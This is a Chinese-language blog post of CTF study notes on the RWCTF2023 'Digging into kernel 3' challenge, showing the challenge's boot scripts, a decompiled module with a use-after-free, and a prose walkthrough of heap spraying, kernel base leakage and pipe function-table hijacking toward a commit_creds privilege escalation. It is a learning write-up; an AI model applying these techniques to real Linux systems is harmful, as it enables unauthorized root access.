<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>kernel学习笔记2 | ixout's blog</title><meta name="author" content="ixout"><meta name="copyright" content="ixout"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="几道内核堆例题用以巩固">
<meta property="og:type" content="article">
<meta property="og:title" content="kernel学习笔记2">
<meta property="og:url" content="https://ixout.github.io/posts/63384/index.html">
<meta property="og:site_name" content="ixout&#39;s blog">
<meta property="og:description" content="几道内核堆例题用以巩固">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/indeximg.jpg">
<meta property="article:published_time" content="2024-01-08T09:35:11.000Z">
<meta property="article:modified_time" content="2024-02-05T14:41:31.463Z">
<meta property="article:author" content="ixout">
<meta property="article:tag" content="kernel">
<meta property="article:tag" content="heap">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/indeximg.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ixout.github.io/posts/63384/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'kernel学习笔记2',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-02-05 22:41:31'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/mainColor/heoMainColor.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/poem.css"><link rel="stylesheet" href="/css/footerb.css"><link rel="stylesheet" href="/css/bolang.css"><link rel="stylesheet" href="/css/jzbar.css"><link rel="stylesheet" href="/css/trans.css"><link rel="stylesheet" href="/css/gundongtiao.css"><link rel="stylesheet" href="/css/shubiao.css"><link rel="stylesheet" href="/css/fengche.css"><link rel="stylesheet" href="/css/alitubiao.css"><link rel="stylesheet" href="/css/fps.css"><span id="fps"></span><link rel="stylesheet" href="/css/yituliu.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.css" media="defer" onload="this.media='all'"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ixout's blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="pokeball-back"></div><div class="pokeball-loading"><div class="pokeball" id="pokeball-normal"></div><div class="pokeball" id="pokeball-great"></div><div class="pokeball" id="pokeball-ultra"></div><div class="pokeball" id="pokeball-master"></div><div class="pokeball" id="pokeball-safari"></div></div></div><script async="async">const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
document.getElementById('loading-box').addEventListener('click',()=> {preloader.endLoading()})
setTimeout(function(){preloader.endLoading();}, 7000);

if (false) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="/css/jzbar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">46</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-fenlei"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/ixout/picture@main/img/indeximg.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="ixout's blog"><span class="site-name">ixout's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-fenlei"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">kernel学习笔记2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-08T09:35:11.000Z" title="发表于 2024-01-08 17:35:11">2024-01-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-02-05T14:41:31.463Z" title="更新于 2024-02-05 22:41:31">2024-02-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>25分钟</span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="RWCTF2023-体验赛-Digging-into-kernel-3"><a href="#RWCTF2023-体验赛-Digging-into-kernel-3" class="headerlink" title="RWCTF2023 体验赛 - Digging into kernel 3"></a>RWCTF2023 体验赛 - Digging into kernel 3</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先看启动脚本</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">   1   │ <span class="comment">#!/bin/sh</span></span><br><span class="line">   2   │ </span><br><span class="line">   3   │ qemu-system-x86_64 \</span><br><span class="line">   4   │     -m 128M \</span><br><span class="line">   5   │     -nographic \</span><br><span class="line">   6   │     -kernel ./bzImage \</span><br><span class="line">   7   │     -initrd ./rootfs.img \</span><br><span class="line">   8   │     -cpu kvm64,+smap,+smep \</span><br><span class="line">   9   │     -monitor /dev/null \</span><br><span class="line">  10   │     -append <span class="string">&#x27;console=ttyS0 kaslr kpti=1 quiet oops=panic panic=1 init=/init&#x27;</span> \</span><br><span class="line">  11   │     -no-reboot \</span><br><span class="line">  12   │     -snapshot \</span><br><span class="line">  13   │     -s</span><br><span class="line">  14   │     </span><br><span class="line">  15   │     <span class="comment">#-enable-kvm \</span></span><br><span class="line">───────┴────────────────────────────────────────</span><br></pre></td></tr></table></figure>
<p>可以看到开启了smap,smep,kaslr,kpri等保护</p>
<p>再看init脚本</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1   │ <span class="comment">#!/bin/sh</span></span><br><span class="line">   2   │ </span><br><span class="line">   3   │ <span class="built_in">mkdir</span> /tmp </span><br><span class="line">   4   │ mount -t proc none /proc </span><br><span class="line">   5   │ mount -t sysfs none /sys </span><br><span class="line">   6   │ mount -t devtmpfs none /dev </span><br><span class="line">   7   │ mount -t tmpfs none /tmp </span><br><span class="line">   8   │ </span><br><span class="line">   9   │ <span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line">  10   │ <span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line">  11   │ <span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line">  12   │ </span><br><span class="line">  13   │ insmod /rwctf.ko</span><br><span class="line">  14   │ <span class="built_in">chmod</span> 666 /dev/rwctf</span><br><span class="line">  15   │ <span class="built_in">chmod</span> 700 /flag</span><br><span class="line">  16   │ <span class="built_in">chmod</span> 400 /proc/kallsyms</span><br><span class="line">  17   │ </span><br><span class="line">  18   │ <span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">  19   │ <span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">  20   │ </span><br><span class="line">  21   │ poweroff -d 120 -f &amp;</span><br><span class="line">  22   │ </span><br><span class="line">  23   │ <span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span> </span><br><span class="line">  24   │ setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">  25   │ </span><br><span class="line">  26   │ umount /proc</span><br><span class="line">  27   │ umount /sys</span><br><span class="line">  28   │ umount /tmp</span><br><span class="line">  29   │ </span><br><span class="line">  30   │ poweroff -d 0 -f</span><br></pre></td></tr></table></figure>
<p>kptr_restrict参数控制是否对非特权用户隐藏内核符号地址的显示。</p>
<p>dmesg_restrict参数控制非特权用户对内核日志dmesg的访问权限。</p>
<p>为1就是非特权用户无权访问</p>
<p>那么主要就是利用rwctf.ko这个模块了</p>
<p>ida打开分析</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">rwmod_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// r12d</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">-1</span>;</span><br><span class="line">  cdev = <span class="number">255</span>;</span><br><span class="line">  qword_7A8 = (__int64)<span class="string">&quot;rwctf&quot;</span>;</span><br><span class="line">  qword_7B0 = (__int64)&amp;file_ops;</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)misc_register(&amp;cdev) )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="number">0</span>;</span><br><span class="line">    printk(&amp;unk_1B9);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>misc_register()</code> 函数用于注册杂项字符设备</p>
<p>注册的函数真正有用的函数便只有ioctl</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">rwmod_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !a3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0xC0DECAFE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_from_user(&amp;v7, a3, <span class="number">16LL</span>) &amp;&amp; v7 &lt;= <span class="number">1</span> )</span><br><span class="line">      kfree(buf[v7]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0xDEADBEEF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;v7, a3, <span class="number">16LL</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    v5 = v7;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt; <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    buf[v5] = _kmalloc(v8, <span class="number">3520LL</span>);</span><br><span class="line">    v6 = buf[v7];</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt; <span class="number">2147483647uLL</span> )</span><br><span class="line">      BUG();</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(v6, v9, v8) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到有明显的uaf漏洞,此外申请内存时最多只能同时控制两个obj</p>
<p>且必须申请后才能使用,这点倒是内核模块中似乎都如此</p>
<h2 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h2><p>这个解法是ctf-wiki为了讲解heap-spray特意选用的一种方法,为了讲解这一技巧可能选用了不那么直接的方法</p>
<p>核心思路是通过uaf改大user_key_payload的datalen字段,以此做到溢出并泄露内核基址,并再次通过uaf写pipe管道的函数表字段从而完成最终利用</p>
<p>为了方便利用需要将decription长度和payload的长度区分开,以此简化利用模型,只需要考虑payload的两个obj</p>
<p><strong>add_key() 会先分配一个临时的 obj1 拷贝 payload 后再分配一个 obj2 作为 user_key_payload</strong>，若我们先分配一个 obj 并释放后再调用 add_key() 则该 obj 不会直接成为 <code>user_key_payload</code> ，而是会在后续的数次分配中都作为拷贝 payload 的临时 obj 存在。</p>
<blockquote>
<p>另一个显然的办法是程序提供了两个obj的管理,那就使用这两个指针来uaf,但这里wiki为了展示堆喷这一技巧选择就用一个指针来完成</p>
<p>此外个人的一个想法是能不能使得obj1与obj2位于两个kmem_cache分配器中,其中关键的user_key_payload位于192,临时obj1则位于128,有时间可以试试</p>
</blockquote>
<p><strong>但我们可以通过堆喷将 UAF obj 分配到 user_key_payload</strong>，考虑如下流程：</p>
<ul>
<li>利用题目功能构建 UAF object。</li>
<li>堆喷射 <code>user_key_payload</code> ，UAF obj 作为拷贝 payload 的临时 obj 存在。</li>
<li><code>kmem_cache_cpu</code> 的 slub page 耗光，向 node 请求新的 slub page 分配 <code>user_key_payload</code> ，完成后 UAF obj 被释放并回到 <code>kmem_cache_node</code>。</li>
<li>继续堆喷 <code>user_key_payload</code> ，<code>kmem_cache_cpu</code> 的 slub page 耗光，向 node 请求新的 slub page 分配 <code>user_key_payload</code> 。</li>
<li>UAF obj 所在页面被取回，UAF obj 被分配为 <code>user_key_payload</code> 。</li>
<li>利用题目功能再次释放 UAF obj，利用题目功能进行堆喷获取到该 obj，从而覆写 <code>user_key_payload</code> 。</li>
</ul>
<p>可能有点难理解,简单来说就是每次add_key会使用两个obj,第一个是临时obj最终会释放,而我们的目标是uaf第二个user_key_payload,</p>
<p>每次add_key实际上slab减少一个obj,因此在耗尽第一个slab之前显然每次我们uaf控制的都是临时obj,但在第一个slab仅剩一个obj时,这个obj被用来做第一个临时obj,而去一个新的slab获取第二个obj用作user_key_payload,那么在这次add_key结束后,第一个obj又被释放,那么在第二个slab仅剩一个obj时,再来一次add_key就会使我们能够uaf的obj作为user_key_payload</p>
<p>接下来我们考虑越界读取什么数据，这里我们并不需要分配其他的结构体， <code>rcu_head-&gt;func</code> <strong>函数指针在 rcu 对象被释放后才会被写入并调用，但调用完并不会将其置为 NULL</strong>，因此我们可以通过释放密钥的方式在内核堆上留下内核函数指针，从而完成内核基址的泄露。即通过key_read泄露slab页中残余的函数指针</p>
<p>可以用来控制内核执行流的结构体有很多，但是我们需要考虑如何完整地执行 <code>commit_creds(prepare_kernel_cred(NULL))</code> 后再成功返回用户态，因此我们需要进行栈迁移以布置较为完整的 ROP gadget chain。</p>
<p>由于题目开启了 SMEP、SMAP 保护，因此我们只能在内核空间伪造函数表，同时<u>内核中的大部分结构体的函数表为静态指定</u>（例如 <code>tty-&gt;ops</code> 总是 <code>ptm（或pty）_unix98_ops</code>），因此我们还需要知道一个内容可控的内核对象的地址，从而在内核空间中伪造函数表。</p>
<p>wiki选择管道相关的结构体完成利用；在内核中，管道本质上是创建了一个<strong>虚拟的 inode</strong> 来表示的，对应的就是一个 <code>pipe_inode_info</code> 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">    <span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;<span class="comment">//该结构体使用kmalloc-192分配</span></span><br></pre></td></tr></table></figure>
